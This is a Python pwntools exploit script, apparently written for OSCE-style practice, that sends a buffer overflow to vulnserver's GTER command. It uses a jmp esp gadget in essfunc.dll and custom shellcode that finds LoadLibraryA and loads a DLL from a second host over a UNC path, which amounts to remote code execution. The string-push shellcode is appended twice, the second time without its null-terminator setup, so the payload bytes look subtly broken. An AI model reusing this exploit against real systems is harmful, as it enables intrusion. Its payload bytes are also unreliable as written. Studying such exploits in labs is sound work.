from pwn import *

ip = "192.168.23.163"
port = 9999

sh = connect(ip, port)

print sh.recvrepeat(1)

# EIP contains normal pattern : 0x66413066 (offset 151)
# ESP (0x0238f9e0) points at offset 155 in normal pattern (length 20)
# EBP contains normal pattern : 0x41396541 (offset 147)
# EAX points to the start of the buffer

# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\vulnserver\essfunc.dll)
# dynamically locate the address of LoadLibraryA in kernel32.dll with very limited shellcode space. so jump to esp(after ret) to execute few commands, then jump to eax(the start of the buffer) to continue executing the rest of the shellcode and finally load the dll through unc path.

shellcode = "\x83\xc4\x7c\x8b\x5b\x10\x31\xf6\x56\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\x8b\x43\x3c\x01\xd8\x8b\x40\x78\x01\xd8\x8b\x50\x14\x8b\x48\x1c\x01\xd9\x51\x8b\x48\x20\x01\xd9\x51\x8b\x48\x24\x01\xd9\x51\x31\xc0\x8b\x7c\x24\x04\x8b\x74\x24\x10\x31\xc9\xfc\x8b\x3c\x87\x01\xdf\x66\x83\xc1\x0c\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe3\x8b\x0c\x24\x8b\x54\x24\x08\x66\x8b\x04\x41\x8b\x04\x82\x01\xd8"

"""
$ python /root/osce/push_string.py "\\\\192.168.23.133\\x\\a.dll"
xor ebx, ebx
push ebx
push 0x6c6c642e
push 0x615c785c
push 0x3333312e
push 0x33322e38
push 0x36312e32
push 0x39315c5c
"""
shellcode += "\x31\xdb\x53\x68\x2e\x64\x6c\x6c\x68\x5c\x78\x5c\x61\x68\x2e\x31\x33\x33\x68\x38\x2e\x32\x33\x68\x32\x2e\x31\x36\x68\x5c\x5c\x31\x39"

shellcode += "\x68\x2e\x64\x6c\x6c\x68\x5c\x78\x5c\x61\x68\x2e\x31\x33\x33\x68\x38\x2e\x32\x33\x68\x32\x2e\x31\x36\x68\x5c\x5c\x31\x39"
shellcode += asm("push esp")
shellcode += asm("call eax")

buf = "GTER \x01"
crash = ""
crash += shellcode
crash += "\x01"*(150-len(crash))
crash += "\x03\x12\x50\x62"
crash += asm("xor esi, esi")
crash += asm("mov ebx, fs:[esi+0x30]")
crash += asm("mov ebx, [ebx + 0x0C]")
crash += asm("mov ebx, [ebx + 0x14]")
crash += asm("mov ebx, [ebx]")
crash += asm("mov ebx, [ebx]")
crash += asm("jmp eax")
crash += "C"*(3000-len(crash))
buf += crash

sh.sendline(buf)

sh.close()

